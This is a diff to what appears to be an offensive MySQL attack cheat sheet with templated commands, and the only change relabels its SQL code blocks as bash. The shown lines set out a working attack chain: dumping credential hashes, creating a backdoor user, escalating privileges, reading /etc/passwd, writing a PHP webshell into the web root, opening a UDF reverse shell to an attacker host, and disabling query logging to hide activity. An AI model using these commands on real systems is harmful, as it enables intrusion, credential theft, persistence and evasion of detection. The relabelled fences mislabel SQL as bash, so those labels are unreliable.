@@ -40,7 +40,7 @@ mysql -u {{USERNAME:str}} -p -h {{TARGET:ip}} --skip-ssl
 ## list databases tables
 Enumerate available databases and tables in current DB.
 
-```sql
+```bash
 SHOW DATABASES;
 USE {{DATABASE:str}};
 SHOW TABLES;
@@ -53,7 +53,7 @@ SHOW TABLES;
 ## describe table structure
 View column names, types, and constraints for a table.
 
-```sql
+```bash
 DESCRIBE {{TABLE:str:users}};
 ```
 
@@ -64,7 +64,7 @@ DESCRIBE {{TABLE:str:users}};
 ## dump user hashes
 Read MySQL user table for credential hashes.
 
-```sql
+```bash
 SELECT User, Host, authentication_string FROM mysql.user;
 ```
 
@@ -75,7 +75,7 @@ SELECT User, Host, authentication_string FROM mysql.user;
 ## show user grants privileges
 List grants assigned to a specific user account.
 
-```sql
+```bash
 SHOW GRANTS FOR '{{USERNAME:str}}'@'{{HOST:str:%}}';
 ```
 
@@ -86,7 +86,7 @@ SHOW GRANTS FOR '{{USERNAME:str}}'@'{{HOST:str:%}}';
 ## show version variables config
 Inspect MySQL configuration and version for known CVEs.
 
-```sql
+```bash
 SELECT VERSION();
 SHOW VARIABLES;
 ```
@@ -98,7 +98,7 @@ SHOW VARIABLES;
 ## create backdoor user privileges
 Create a new MySQL user with full privileges from any host.
 
-```sql
+```bash
 CREATE USER '{{USERNAME:str:hacker}}'@'%' IDENTIFIED BY '{{PASSWORD:str:Pwn3d!}}';
 GRANT ALL PRIVILEGES ON *.* TO '{{USERNAME:str:hacker}}'@'%';
 FLUSH PRIVILEGES;
@@ -111,7 +111,7 @@ FLUSH PRIVILEGES;
 ## privesc update mysql.user
 Grant SUPER privilege by updating mysql.user directly.
 
-```sql
+```bash
 UPDATE mysql.user SET Super_priv='Y' WHERE user='{{USERNAME:str}}';
 FLUSH PRIVILEGES;
 ```
@@ -123,7 +123,7 @@ FLUSH PRIVILEGES;
 ## read file load data infile
 Read a local file into a MySQL table (server-side).
 
-```sql
+```bash
 LOAD DATA INFILE '/etc/passwd' INTO TABLE {{TABLE:str:backup}};
 ```
 
@@ -134,7 +134,7 @@ LOAD DATA INFILE '/etc/passwd' INTO TABLE {{TABLE:str:backup}};
 ## write webshell into outfile
 Write attacker-controlled data to disk (e.g., webshell).
 
-```sql
+```bash
 SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
 
@@ -145,7 +145,7 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 ## reverse shell udf rce
 Execute system commands through user-defined function (lib_mysqludf_sys).
 
-```sql
+```bash
 CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 SELECT sys_exec('bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1');
 ```
@@ -168,7 +168,7 @@ mysqldump -h {{TARGET:ip}} -u {{USERNAME:str}} -p {{DATABASE:str}} > {{OUTFILE:f
 ## toggle query logging evasion
 Enable or disable general_log to capture or hide SQL queries.
 
-```sql
+```bash
 SET GLOBAL general_log = 'ON';
 SET GLOBAL general_log = 'OFF';
 SHOW VARIABLES LIKE 'general_log_file';
